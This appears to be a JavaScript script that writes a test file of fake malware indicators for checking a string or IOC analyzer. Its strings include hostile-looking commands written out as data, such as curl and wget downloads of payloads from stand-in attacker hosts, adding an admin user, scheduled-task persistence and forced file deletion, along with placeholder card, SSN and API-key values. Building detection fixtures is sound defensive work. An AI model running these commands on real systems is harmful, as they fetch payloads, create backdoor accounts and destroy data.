// guaranteed-test.js - Creates a file that WILL produce results
import fs from "fs";

// Create test content with guaranteed strings and IOCs
const testContent = [
  "Microsoft Windows Executable",
  "This program cannot be run in DOS mode",
  "KERNEL32.DLL",
  "USER32.DLL", 
  "LoadLibraryA",
  "GetProcAddress",
  "CreateFileA",
  "WriteFile",
  "ReadFile",
  "CloseHandle",
  "ExitProcess",
  "MessageBoxA",
  "Hello World from malware",
  "Visit https://malicious-site.com for more info",
  "Download from http://evil-domain.org/payload.exe",
  "Contact hacker@badguys.net for support",
  "Connect to 192.168.1.100 on port 4444",
  "Backdoor listening on 10.0.0.5:8080",
  "C:\\Windows\\System32\\notepad.exe",
  "C:\\temp\\malware.exe",
  "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
  "powershell.exe -ExecutionPolicy Bypass",
  "cmd.exe /c del /f /q",
  "net user admin password123 /add",
  "reg add HKLM\\Software\\Policies",
  "taskkill /f /im explorer.exe",
  "schtasks /create /tn backdoor",
  "curl -o payload.exe http://attacker.com/malware",
  "wget http://bad-site.ru/trojan.bin",
  "email: support@legit-bank.com",
  "bitcoin wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
  "credit card: 4532-1234-5678-9012",
  "ssn: 123-45-6789",
  "api key: sk_live_abcd1234567890",
  "password: admin123!@#",
  "Secret encryption key: AES256_KEY_HERE",
  "Database connection: mongodb://user:pass@db.evil.com:27017",
  "CRYPTED_DATA_STARTS_HERE",
  "Base64Data: SGVsbG8gV29ybGQh",
  "Hex: 48656c6c6f20576f726c6421",
  "MALWARE_SIGNATURE_DETECTED",
  "VIRUS_PATTERN_MATCH",
  "TROJAN_BEHAVIOR_ANALYSIS"
].join("\n");

// Write as binary file to avoid encoding issues
const buffer = Buffer.from(testContent, 'ascii');

fs.writeFileSync("guaranteed-test.bin", buffer);

console.log("✅ Created guaranteed-test.bin");
console.log(`📊 File size: ${buffer.length} bytes`);
console.log(`📝 Content preview:`);
console.log(testContent.substring(0, 200) + "...");
console.log(`\n🎯 This file contains:`);
console.log(`   - ${testContent.split('\n').length} lines of text`);
console.log(`   - Multiple URLs and domains`);
console.log(`   - Email addresses`);
console.log(`   - IP addresses`);
console.log(`   - Windows executable strings`);
console.log(`   - Registry keys`);
console.log(`   - Command line tools`);
console.log(`   - Sensitive data patterns`);
console.log(`\n📤 Upload this file to test your analyzer!`);